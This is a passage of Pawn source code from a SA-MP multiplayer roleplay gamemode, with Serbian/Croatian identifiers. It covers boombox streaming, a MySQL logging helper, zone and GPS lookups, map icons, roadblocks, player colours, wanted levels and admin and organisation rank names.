		}
	}
	return IPI;
}

_:public Boombox_SetURL(playerid, url[])
{
	if( BoomboxInfo[ playerid ][ boomboxPlaced ] )
	{
	    strpack( BoomboxInfo[ playerid ][ boomboxURL ], url, 256 char);

	    foreach(new i : Player)
		{
			if(Boombox[ i ] == playerid)
			{
				StopAudioStreamForPlayer(i);
				PlayAudioStreamForPlayer(i, url, BoomboxInfo[ playerid ][ boomboxPos ][ 0 ], BoomboxInfo[ playerid ][ boomboxPos ][ 1 ], BoomboxInfo[ playerid ][ boomboxPos ][ 2 ], 30.0, 1);
			}
		}
	}
	return 1;
}

_:public Boombox_Destroy(playerid)
{
	if(BoomboxInfo[ playerid ][boomboxPlaced])
	{
		if( IsValidDynamicObject(BoomboxInfo[ playerid ][boomboxObject ] ) ) DestroyDynamicObject(BoomboxInfo[ playerid ][boomboxObject] );
		if( IsValidDynamic3DTextLabel(BoomboxInfo[ playerid ][boomboxText3D ] ) ) DestroyDynamic3DTextLabel(BoomboxInfo[ playerid ][boomboxText3D] );

		foreach(new i : Player)
		{
			if(Boombox[ i ] == playerid)
			{
			    StopAudioStreamForPlayer(i);
			}
		}
        BoomboxInfo[ playerid ][ boomboxPlaced ] = false;
        BoomboxInfo[ playerid ][ boomboxInterior ] = 0;
        BoomboxInfo[ playerid ][ boomboxWorld ] = 0;
	}
	return 1;
}
//------------------------------------------------------------------------------
WriteLog(table[], const text[], {Float, _}:...)
{
	static
  	    args,
	    str[1024];

	if((args = numargs()) <= 2)
	{
	    mysql_format(mSQL, str, sizeof(str), "INSERT INTO `%e` VALUES(NOW(), '%s')", table, text);
	    mysql_tquery(mSQL, str);
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		mysql_format(mSQL, str, sizeof(str), "INSERT INTO `%e` VALUES(NOW(), '%e')", table, str);
	    mysql_tquery(mSQL, str);

		#emit RETN
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public GetZoneName(Float:x, Float:y, zone[], len)
{
	for( new i = 0; i != sizeof(gSAZones); i++ )
	{
		if(x >= gSAZones[ i ][SAZONE_AREA][ 0 ] && x <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y >= gSAZones[ i ][SAZONE_AREA][ 1 ] && y <= gSAZones[ i ][SAZONE_AREA][4])
		{
			return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
		}
	}
	return(false);
}

_:public Float:PointAngle(playerid, Float:xa, Float:ya, Float:xb, Float:yb)
{
	new Float:carangle, Float:xc, Float:yc, Float:angle;
	xc = floatabs(floatsub(xa,xb));
	yc = floatabs(floatsub(ya,yb));

	if(yc == 0.0 || xc == 0.0)
	{
		if(yc == 0 && xc > 0) angle = 0.0;
		else if(yc == 0 && xc < 0) angle = 180.0;
		else if(yc > 0 && xc == 0) angle = 90.0;
		else if(yc < 0 && xc == 0) angle = 270.0;
		else if(yc == 0 && xc == 0) angle = 0.0;
	}
	else
	{
		angle = atan(xc/yc);
		if(xb > xa && yb <= ya) angle += 90.0;
		else if(xb <= xa && yb < ya) angle = floatsub(90.0, angle);
		else if(xb < xa && yb >= ya) angle -= 90.0;
		else if(xb >= xa && yb > ya) angle = floatsub(270.0, angle);
	}
	GetVehicleZAngle(GetPlayerVehicleID(playerid), carangle);
	return floatadd(angle, -carangle);
}

_:public setPlayerGps(playerid, Float:x, Float:y, Float:z)
{
	if(PlayerInfo[ playerid ][xGpsLevel] >= 1)
	{
		if( IsValidDynamicMapIcon(PlayerGpsRadar[ playerid ][_pgrIconId ] ) ) DestroyDynamicMapIcon(PlayerGpsRadar[ playerid ][_pgrIconId] );

	    PlayerGpsRadar[ playerid ][ _pgrPos ][ 0 ] = x;
        PlayerGpsRadar[ playerid ][ _pgrPos ][ 1 ] = y;
        PlayerGpsRadar[ playerid ][ _pgrPos ][ 2 ] = z;
        PlayerGpsRadar[ playerid ][ _pgrIconId ] = CreateDynamicMapIcon(x, y, z, 0, CRVENA, -1, -1, playerid, 6000.0, MAPICON_GLOBAL, .priority = 100);

        SetPlayerTimerEx(playerid, "UpdatePlayerGps", 100, false, "ii", playerid, 1);
        if( PlayerInfo[ playerid ][ xGpsLevel ] >= 2 )
		{
		    if( IsPlayerInAnyVehicle( playerid ) )
			{
                if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] ) ) DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );

			    new 
			    	Float:VPos[ 3 ],
			    	Float:Rotation;

                PlayerGpsRadar[ playerid ][ _pgrObject ] = CreateDynamicObject(19133, 0, 0, 1100, 0.0, 0.0, 0.0, -1, -1, playerid );

			 	GetVehiclePos( GetPlayerVehicleID( playerid ), VPos[ 0 ], VPos[ 1 ], VPos[ 2 ] );
			 	Rotation = PointAngle( playerid, VPos[ 0 ], VPos[ 1 ], x, y );
				AttachDynamicObjectToVehicle( PlayerGpsRadar[ playerid ][ _pgrObject ], GetPlayerVehicleID( playerid ), 0.0, 0.0, 1.5, 0.0, 90.0, Rotation );
			}
		}

		KoristimGPS[playerid] = true;
	}
}

//------------------------------------------------------------------------------

CreateDefaultMapIcons()
{
	// Grotti
    CreateDynamicMapIcon( 542.5590, -1293.0958, 18.5787, 55, -1, -1, -1, -1, 600.0);

    // City Halls
    CreateDynamicMapIcon( 1482.7301, -1771.4841, 18.7958, 20, -1, -1, -1, -1, 600.0);

    // Bank
    CreateDynamicMapIcon( 1458.9601, -1025.0674, 23.8390, 52, -1, -1, -1, -1, 600.0);

    // Bingo
    CreateDynamicMapIcon(1283.1431, -1542.3771, 13.5187, 25, -1, -1, -1, -1, 600.0);
}

CreateBizzIcons()
{
    foreach(new i : iter_Bizz)
	{
		switch(BusinessInfo[ i ][ bType ])
		{
			case VRSTA_BINCO, VRSTA_SUBURBAN, VRSTA_ZIP, VRSTA_VICTIM: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 45, -1, -1, -1, -1, 500.0 );
			case VRSTA_BURG: CreateDynamicMapIcon(BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 10, -1, -1, -1, -1, 500.0);
			case VRSTA_CLUCK: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 14, -1, -1, -1, -1, 500.0);
			case VRSTA_PIZZA: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 29, -1, -1, -1, -1, 500.0);
			case VRSTA_GYM: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 54, -1, -1, -1, -1, 500.0);
			case VRSTA_GUNSHOP: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 6, -1, -1, -1, -1, 500.0);
			case VRSTA_BAR: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 49, -1, -1, -1, -1, 500.0);
			case VRSTA_RESTORAN: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 50, -1, -1, -1, -1, 500.0);
			case VRSTA_NKLUB, VRSTA_DISCO: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 48, -1, -1, -1, -1, 500.0);
			case VRSTA_MARKET: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 36, -1, -1, -1, -1, 500.0);
			case VRSTA_ELEKTRONIK: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 17, -1, -1, -1, -1, 500.0);
			case VRSTA_TRAFIKA: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 42, 0x17FF2EFF, -1, -1, -1, 500.0);
			case VRSTA_JAVNAK: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 21, -1, -1, -1, -1, 500.0);
			case VRSTA_KLAD: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 25, -1, -1, -1, -1, 500.0);
			case VRSTA_CASINO: CreateDynamicMapIcon( BusinessInfo[ i ][ bEnterX ], BusinessInfo[ i ][ bEnterY ], BusinessInfo[ i ][ bEnterZ ], 44, -1, -1, -1, -1, 500.0);
		}
	}
}

//------------------------------------------------------------------------------

_:public CreateRoadblock( playerid, Object, Float:x, Float:y, Float:z, Float:Angle )
{
    new i = Iter_Free(iter_Roadblock);
    if(i == -1) return SendErrorMessage(playerid, "Trenutno je kreirano maksimalno roadblockova.");

    Roadblocks[ i ][ sX ] = x;
    Roadblocks[ i ][ sY ] = y;
    Roadblocks[ i ][ sZ ] = z-0.7;
    Roadblocks[ i ][ sSpike ] = false;
    Roadblocks[ i ][ sObject ] = CreateDynamicObject( Object, x, y, z-0.9, 0, 0, Angle);

    EditRoadblock[playerid] = i;
    EditDynamicObject(playerid, Roadblocks[ i ][ sObject ]);

    Iter_Add(iter_Roadblock, i);
	return 1;
}

_:public CreateSpike( playerid, Object, Float:x, Float:y, Float:z, Float:Angle )
{
    new i = Iter_Free(iter_Roadblock);
    if(i == -1) return SendErrorMessage(playerid, "Trenutno je kreirano maksimalno roadblockova.");

    Roadblocks[ i ][ sX ] = x;
    Roadblocks[ i ][ sY ] = y;
    Roadblocks[ i ][ sZ ] = z-0.7;
    Roadblocks[ i ][ sSpike ] = true;
    Roadblocks[ i ][ sObject ] = CreateDynamicObject( Object, x, y, z-1, 0, 0, Angle-90);

    EditRoadblock[playerid] = i;
    EditDynamicObject(playerid, Roadblocks[ i ][ sObject ]);

    Iter_Add(iter_Roadblock, i);
    return 0;
}

_:public DeleteAllRoadblocks( playerid )
{
    foreach(new i : iter_Roadblock)
  	{
	    Roadblocks[ i ][sX] = 0.0;
	    Roadblocks[ i ][sY] = 0.0;
	    Roadblocks[ i ][sZ] = 0.0;
	    Roadblocks[ i ][sSpike] = false;

	    DestroyDynamicObject(Roadblocks[ i ][sObject]);
	    Iter_SafeRemove(iter_Roadblock, i, i);
	}
	return 1;
}

_:public DeleteClosestRoadblock( playerid )
{
    foreach(new i : iter_Roadblock)
  	{
  	    if( IsPlayerInRangeOfPoint( playerid, 5.0, Roadblocks[ i ][sX], Roadblocks[ i ][sY], Roadblocks[ i ][sZ] ) )
        {
            Roadblocks[ i ][sX] = 0.0;
            Roadblocks[ i ][sY] = 0.0;
            Roadblocks[ i ][sZ] = 0.0;
            Roadblocks[ i ][sSpike] = false;

            DestroyDynamicObject(Roadblocks[ i ][sObject]);
            Iter_SafeRemove(iter_Roadblock, i, i);
  	    }
  	}
  	return 1;
}

_:public SMG_SetPlayerColor(playerid)
{
	if(PlayerInfo[playerid][xAdmin] > 0 && AdminDuty[playerid])
	{
		if(PlayerInfo[playerid][xAdmin] >= 1 && PlayerInfo[playerid][xAdmin] <= 5) SetPlayerColor(playerid, 0xFFFF00FF);
		else if(PlayerInfo[playerid][xAdmin] >= 6 && PlayerInfo[playerid][xAdmin] <= 7) SetPlayerColor(playerid, 0x000000FF);
	}
	else if(PlayerInfo[ playerid ][ xSpecAdmin ] != 0 && AdminDuty[ playerid ]) SetPlayerColor( playerid, 0x4A68C2FF );
	else if(PlayerInfo[ playerid ][ xGamemaster ] != 0 && AdminDuty[ playerid ]) SetPlayerColor( playerid, 0x48E86BFF );
	else if(PlayerInfo[ playerid ][ xDBO ])
	{
	    switch(PlayerInfo[ playerid ][ xDBoja ])
	    {
			case 0: SetPlayerColor(playerid, 0xFFFFFF00); //white
			case 1: SetPlayerColor(playerid, 0xFA737300); //light Red
			case 2: SetPlayerColor(playerid, 0xF01F1F00); //Red
			case 3: SetPlayerColor(playerid, 0x94101000); //dark Red
			case 4: SetPlayerColor(playerid, 0xFA997300); //light Orange
			case 5: SetPlayerColor(playerid, 0xF0611F00); //Orange
			case 6: SetPlayerColor(playerid, 0xBA790000); //dark Orange
			case 7: SetPlayerColor(playerid, 0x7AFA7300); //light Green
			case 8: SetPlayerColor(playerid, 0x50F01F00); //Green
			case 9: SetPlayerColor(playerid, 0x06960200); //dark Green
			case 10: SetPlayerColor(playerid, 0x73FAE100); //light Blue
			case 11: SetPlayerColor(playerid, 0x1FAEF000); //Blue
			case 12: SetPlayerColor(playerid, 0x02609600); //dark Blue
			case 13: SetPlayerColor(playerid, 0xA273FA00); //light Purple
			case 14: SetPlayerColor(playerid, 0x6F1FF000); //Purple
			case 15: SetPlayerColor(playerid, 0x4C029600); //dark Purple
			case 16: SetPlayerColor(playerid, 0xFA73EA00); //light Pink
			case 17: SetPlayerColor(playerid, 0xF01FDF00); //Pink
			case 18: SetPlayerColor(playerid, 0xB8007D00); //dark Pink
	    }
	}
	else if(PlayerInfo[playerid][xVIPLevel] == 6) SetPlayerColor(playerid, 0x57C6A200);
	else SetPlayerColor(playerid, 0xFFFFFF00);
	return 1;
}

//------------------------------------------------------------------------------

_:public SMG_SetPlayerWantedLevel( playerid, broj )
{
	switch( broj )
	{
	    case 0:
		{
	        PlayerTextDrawHide( playerid, WantedLevel_pTD[ playerid ][ 0 ] ), PlayerTextDrawHide( playerid, WantedLevel_pTD[ playerid ][ 1 ] );
	        SMG_SetPlayerColor(playerid);
	    }
	    case 1:
		{
	        PlayerTextDrawSetString( playerid, WantedLevel_pTD[ playerid ][ 0 ], "~r~]" );
	        PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 0 ] ), PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 1 ] );
	        SMG_SetPlayerColor(playerid);
	    }
	    case 2:
		{
	        PlayerTextDrawSetString( playerid, WantedLevel_pTD[ playerid ][ 0 ], "~r~]_]" );
	        PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 0 ] ), PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 1 ] );
	        SMG_SetPlayerColor(playerid);
	    }
	    case 3:
		{
	        PlayerTextDrawSetString( playerid, WantedLevel_pTD[ playerid ][ 0 ], "~r~]_]_]" );
	        PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 0 ] ), PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 1 ] );
	        SMG_SetPlayerColor(playerid);
	    }
	    case 4:
	    {
	        PlayerTextDrawSetString( playerid, WantedLevel_pTD[ playerid ][ 0 ], "~r~]_]_]_]" );
	        PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 0 ] ), PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 1 ] );
	        SMG_SetPlayerColor(playerid);
	    }
	    case 5:
	    {
	        PlayerTextDrawSetString( playerid, WantedLevel_pTD[ playerid ][ 0 ], "~r~]_]_]_]_]" );
	        PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 0 ] ), PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 1 ] );
	        SMG_SetPlayerColor(playerid);
	    }
	}
	return 1;
}
//------------------------------------------------------------------------------
PostaviWanted( playerid, zlocin[], prijavio[], kolicina = 1 )
{
	if( IsPlayerConnected( playerid ) )
	{
		PlayerInfo[ playerid ][ xWanted ] += kolicina;

		if(PlayerInfo[playerid][xWanted] > 10) PlayerInfo[ playerid ][ xWanted ] = 10;
	    SMG_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ] );

        sql_user_update_integer( playerid, "wanted_level", PlayerInfo[ playerid ][ xWanted ] );

		strmid( ZlocinInfo[ playerid ][ zPrijavio ], prijavio, 0, strlen(prijavio), 255);
		strmid( ZlocinInfo[ playerid ][ zPocinio ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
		strmid( ZlocinInfo[ playerid ][ zZlocin ], zlocin, 0, strlen(zlocin), 255);

		SCMF( playerid, 0x4282C0FF, "- Pocinili ste zlocin: {FFFFFF}%s {4282C0}| Prijava od: {FFFFFF}%s.", zlocin, prijavio );
		SCMF( playerid, 0x4282C0FF, "- Trenutni wanted level: {FFFFFF}(%d).", PlayerInfo[ playerid ][ xWanted ] );

		for( new id = 1; id < MAX_ORG; id++)
		{
		    if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
			{ 
				OrgPoruka( id, 0x4282C0FF, "- Imamo novi prijavljen zlocin od: {FFFFFF}%s.", prijavio);
				OrgPoruka( id, 0x4282C0FF, "- Pocinio: {FFFFFF}%s {4282C0}| Zlocin: {FFFFFF}%s {4282C0}| WL pocinioca: {FFFFFF}(%d).", ImeIgraca( playerid ), zlocin, PlayerInfo[ playerid ][ xWanted ]);
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public Igrac2D(playerid, zone[], len)
{
    new Float:x, Float:y, Float:z;
    GetPlayerPos( playerid, x, y, z);
    for( new i = 0; i != sizeof(gSAZones); i++ )
    {
        if(x >= gSAZones[ i ][SAZONE_AREA][ 0 ] && x <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y >= gSAZones[ i ][SAZONE_AREA][ 1 ] && y <= gSAZones[ i ][SAZONE_AREA][4])
        {
            return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
        }
    }
    return(false);
}

_:public GetPlayer2DZone(playerid, zone[], len)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
 	for(new i = 0; i != sizeof(gSAZones); i++)
 	{
		if(x >= gSAZones[ i ][SAZONE_AREA][ 0 ] && x <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y >= gSAZones[ i ][SAZONE_AREA][ 1 ] && y <= gSAZones[ i ][SAZONE_AREA][ 4 ])
		{
			return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
GetPlayerLocation( playerid )
{
	new imeulice[MAX_ZONE_NAME];
   	Igrac2D( playerid, imeulice, sizeof(imeulice));
   	return imeulice;
}
//------------------------------------------------------------------------------
SetTablice( h )
{
	new tablice[ 7 ];
	format( tablice, sizeof( tablice ), "U-%04d", h );
	SetVehicleNumberPlate( h, tablice );
	return 1;
}
//------------------------------------------------------------------------------
Create3DandP(const text[], Float:vXU, Float:vYU, Float:vZU, vInt, vVW, pickupid, Float:radius)
{
	CreateDynamic3DTextLabel(text, 0x4282C1FF, vXU, vYU, vZU, radius, IPI, IVI, 0, vVW, vInt, -1, 10.0);
	CreateDynamicPickup(pickupid, 1, vXU, vYU, vZU, vVW, vInt);
	return 1;
}
//------------------------------------------------------------------------------
UlicaImovine( i )
{
	new imeulice[ MAX_ZONE_NAME ];
   	UlicaImovine2D( i, imeulice, sizeof( imeulice ) );
   	return imeulice;
}

_:public UlicaImovine2D( h, zone[], len )
{
	new Float:x22, Float:y22;
	x22 = II[ h ][ iEnter ][ 0 ]; 
	y22 = II[ h ][ iEnter ][ 1 ];
	for( new i = 0; i != sizeof(gSAZones); i++ )
	{
		if(x22 >= gSAZones[ i ][SAZONE_AREA][ 0 ] && x22 <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y22 >= gSAZones[ i ][SAZONE_AREA][ 1 ] && y22 <= gSAZones[ i ][SAZONE_AREA][4])
		{
		    return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
		}
	}
	return(false);
}
//------------------------------------------------------------------------------
_:public GetSpeed( playerid )
{
    new Float:ST[ 4 ];
    if( IsPlayerInAnyVehicle( playerid ) ) GetVehicleVelocity( GetPlayerVehicleID( playerid ), ST[ 0 ], ST[ 1 ], ST[ 2 ] );
    else GetPlayerVelocity( playerid, ST[ 0 ], ST[ 1 ], ST[ 2 ] );

    ST[ 3 ] = floatsqroot(floatpower(floatabs(ST[ 0 ]), 2.0) + floatpower(floatabs(ST[ 1 ]), 2.0) + floatpower(floatabs(ST[ 2 ]), 2.0)) * 178.8617875;
    return floatround( ST[ 3 ] );
}
//------------------------------------------------------------------------------
_:public IsPlayerFacingVehicle( playerid,vehicleid )
{
	new Float:pX, Float:pY, Float:pZ, Float:X, Float:Y, Float:Z, Float:ang;

	if(!IsPlayerConnected( playerid )) return(false);

	GetVehiclePos( vehicleid, X, Y, Z);
 	GetPlayerPos( playerid, pX, pY, pZ);

	if( Y > pY ) ang = (-acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
 	else if( Y < pY && X < pX ) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 450.0);
  	else if( Y < pY ) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);

	if(X > pX) ang = (floatabs(floatabs(ang) + 180.0));
 	else ang = (floatabs(ang) - 180.0);
  	new Float:russia;
   	GetPlayerFacingAngle( playerid,russia);
   	if(ang-russia<-130 || ang-russia>130) return(false);
    else return 1;
}
//------------------------------------------------------------------------------
GetNameByWatchID( playerid )
{
    new watchName[ 20 ] = "Rolex Datejust";

	switch( PlayerInfo[ playerid ][ xSat ] )
	{
	    case 0: watchName = "Nema sata";
		case 19039: watchName = "Rolex Datejust";
		case 19040: watchName = "Emporio Armani";
		case 19041: watchName = "Casio G-Shock";
		case 19042: watchName = "Michael Kors";
		case 19043: watchName = "Hugo Boss";
	}
	return watchName;
}
//------------------------------------------------------------------------------
getJobName( jobID )
{
	new jobName[24] = "Nezaposlen";

	switch( jobID )
	{
	    case POSAO_NEMA: jobName = "Nezaposlen";
		case POSAO_MEHANICAR: jobName = "Mehanicar";
		case POSAO_PMUNICIJE: jobName = "Proizvodjac Municije";
		case POSAO_PILOT: jobName = "Pilot";
		case POSAO_RUDAR: jobName = "Rudar";
		case POSAO_PNOVCA: jobName = "Prevoznik Novca";
		case POSAO_UBERDRIVER: jobName = "Uber";
		case POSAO_PNAMJESTAJA: jobName = "Proizvodjac Namjestaja";
	}
	return jobName;
}
//------------------------------------------------------------------------------
getAdminRankNameOnDuty( playerid ) 
{
	new admin_rank[20] = "NEPOSTOJECI!";
	switch( PlayerInfo[ playerid ][ xAdmin ] ) 
	{
	    case 0: admin_rank = "NEMA";
		case 1: admin_rank = "Admin 1";
		case 2: admin_rank = "Admin 2";
		case 3: admin_rank = "Admin 3";
		case 4: admin_rank = "Admin 4";
		case 5: admin_rank = "Head Admin";
		case 6: admin_rank = "Direktor";
		case 7: admin_rank = "Vlasnik";
	}
	return admin_rank;
}

getAdminRankNameInChat( playerid ) 
{
	new admin_rank[20] = "NEPOSTOJECI!";

	if( PlayerInfo[ playerid ][ xSpecAdmin ] == 1 ) admin_rank = "Spec Admin";
	else 
	{
		switch( PlayerInfo[ playerid ][ xAdmin ] ) 
		{
		    case 0: admin_rank = "NEMA";
			case 1: admin_rank = "Admin 1";
			case 2: admin_rank = "Admin 2";
			case 3: admin_rank = "Admin 3";
			case 4: admin_rank = "Admin 4";
			case 5: admin_rank = "Head Admin";
			case 6: admin_rank = "Direktor";
			case 7: admin_rank = "Vlasnik";
		}
	}
	return admin_rank;
}

getAdminRankName( playerid )
{
	new admin_rank[20] = "Nepostojeci";

    if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 ) admin_rank = "Skripter";
    else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 ) admin_rank = "Suvlasnik";
	else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) admin_rank = "Mapper";
	else if( PlayerInfo[ playerid ][ xSpecAdmin ] == 1 ) admin_rank = "Spec Admin";
	else
	{
		switch( PlayerInfo[ playerid ][ xAdmin ] )
		{
		    case 0: admin_rank = "Nema";
			case 1: admin_rank = "Admin 1";
			case 2: admin_rank = "Admin 2";
			case 3: admin_rank = "Admin 3";
			case 4: admin_rank = "Admin 4";
			case 5: admin_rank = "Head Admin";
			case 6: admin_rank = "Direktor";
			case 7: admin_rank = "Vlasnik";
		}
	}
	return admin_rank;
}

getRankNameForVeh( playerid )
{
	new admin_rank[20] = "Nepostojeci";

    if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 ) admin_rank = "SKRIPTER";
    else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 ) admin_rank = "SUVLASNIK";
	else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) admin_rank = "MAPPER";
	else if( PlayerInfo[ playerid ][ xSpecAdmin ] == 1 ) admin_rank = "SPEC ADMIN";
	else if( PlayerInfo[ playerid ][ xGamemaster ] != 0 ) admin_rank = "GAMEMASTER";
	else
	{
		switch( PlayerInfo[ playerid ][ xAdmin ] )
		{
		    case 0: admin_rank = "Nema";
			case 1 .. 4: admin_rank = "ADMIN";
			case 5: admin_rank = "HEAD ADMIN";
			case 6: admin_rank = "DIREKTOR";
			case 7: admin_rank = "VLASNIK";
		}
	}
	return admin_rank;
}

getAdminRankNamebyRank( rank )
{
	new admin_rank[20] = "n/a";
	switch( rank )
	{
	    case 0: admin_rank = "Nema";
		case 1: admin_rank = "Admin 1";
		case 2: admin_rank = "Admin 2";
		case 3: admin_rank = "Admin 3";
		case 4: admin_rank = "Admin 4";
		case 5: admin_rank = "Head Admin";
		case 6: admin_rank = "Direktor";
		case 7: admin_rank = "Vlasnik";
	}
	return admin_rank;
}

getAdminRankNamebyRankNumber( rank )
{
	new admin_rank[5] = "n/a";
	switch( rank )
	{
	    case 0: admin_rank = "Nema";
		case 1: admin_rank = "A:1";
		case 2: admin_rank = "A:2";
		case 3: admin_rank = "A:3";
		case 4: admin_rank = "A:4";
		case 5: admin_rank = "A:5";
		case 6: admin_rank = "A:6";
		case 7: admin_rank = "A:7";
	}
	return admin_rank;
}
//------------------------------------------------------------------------------
getGamemasterRankName( playerid )
{
	new h_rank[30] = "Nepostojeci";

	switch( PlayerInfo[ playerid ][ xGamemaster ] )
	{
	    case 0: h_rank = "Nema";
		case 1: h_rank = "GameMaster 1";
		case 2: h_rank = "GameMaster 2";
	}
	return h_rank;
}
//------------------------------------------------------------------------------
getOrgRank( playerid, orgID )
{
	new orgRank[32] = "Civil";

    if( orgID == 0 ) orgRank = "Civil";
    else
	{
		if( PlayerInfo[ playerid ][ xRank ] == 1) format( orgRank, sizeof( orgRank ), "%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oRank1 ] );
		else if( PlayerInfo[ playerid ][ xRank ] == 2) format( orgRank, sizeof( orgRank ), "%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oRank2 ] );
	    else if( PlayerInfo[ playerid ][ xRank ] == 3) format( orgRank, sizeof( orgRank ), "%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oRank3 ] );
	    else if( PlayerInfo[ playerid ][ xRank ] == 4) format( orgRank, sizeof( orgRank ), "%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oRank4 ] );
	    else if( PlayerInfo[ playerid ][ xRank ] == 5) format( orgRank, sizeof( orgRank ), "%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oRank5 ] );
	    else if( PlayerInfo[ playerid ][ xRank ] == 6) format( orgRank, sizeof( orgRank ), "%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oRank6 ] );
	}
	return orgRank;
}
//------------------------------------------------------------------------------
getOrgName( orgID )
{
	new orgName[64] = "Civil";

    if( orgID == 0 ) orgName = "Civil";
	else 
	{
	    if( org_info[ orgID ][ oID ] > 0 ) 
	    {
	    	format( orgName, sizeof( orgName ), "%s", org_info[ orgID ][ oName ] );
		}
		else orgName = "Civil";
	}
	return orgName;
}
//------------------------------------------------------------------------------
_:public NearestGate(playerid) 
{
	new Float:p_Pos[3], Float:maxradius = 8.0, id = -1;
	GetPlayerPos(playerid, p_Pos[0], p_Pos[1], p_Pos[2]);

    foreach(new i : iter_Gate)
    {
    	if(GetPlayerInterior(playerid) == GateData[i][gateInterior] && GetPlayerVirtualWorld(playerid) == GateData[i][gateWorld])
    	{
        	if(VectorSize(p_Pos[0] - GateData[i][gatePos][0], p_Pos[1] - GateData[i][gatePos][1], p_Pos[2] - GateData[i][gatePos][2]) >= maxradius) continue;

        	id = i;
        	maxradius = VectorSize(p_Pos[0] - GateData[i][gatePos][0], p_Pos[1] - GateData[i][gatePos][1], p_Pos[2] - GateData[i][gatePos][2]);
        }
    }
    return id;
}
//------------------------------------------------------------------------------
_:public Gate_Operate( playerid, gateid )
{
	if( gateid != -1 && GateData[ gateid ][ gateModel ] )
	{
		if( !GateData[ gateid ][ gateOpened ] )
		{
		    GateData[ gateid ][ gateOpened ] = true;
